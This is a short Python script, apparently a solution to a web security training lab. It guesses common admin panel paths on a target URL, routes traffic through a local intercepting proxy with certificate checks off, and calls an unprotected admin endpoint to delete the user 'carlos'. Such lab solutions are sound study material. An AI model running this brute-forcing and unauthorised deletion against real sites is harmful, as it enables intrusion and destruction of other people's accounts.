import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def admin_panel(url):
    path = '/'
    lis = ['admin','administrator','admin-panel','administrator-panel']
    print('(+) Directory Brute-forcing...')
    for i in lis:
        r = requests.get(url+path+i, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) "'+i+'" found')
            return i

def unprotected_admin(url):
    directory = admin_panel(url)
    path = '/'+directory
    r1 = requests.get(url+path, verify=False, proxies=proxies)
    if 'Users' not in r1.text:
        exit(-1)
    carlos_uri = path+'/delete?username=carlos'
    r2 = requests.get(url+carlos_uri, verify=False, proxies=proxies)
    if 'User deleted successfully!' in r2.text:
        print('(+) User carlos deleted')


if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print('Usage: python %s <url>' %sys.argv[0])
        print('Example: python %s example.com' %sys.argv[0])
        sys.exit(-1)
    unprotected_admin(url)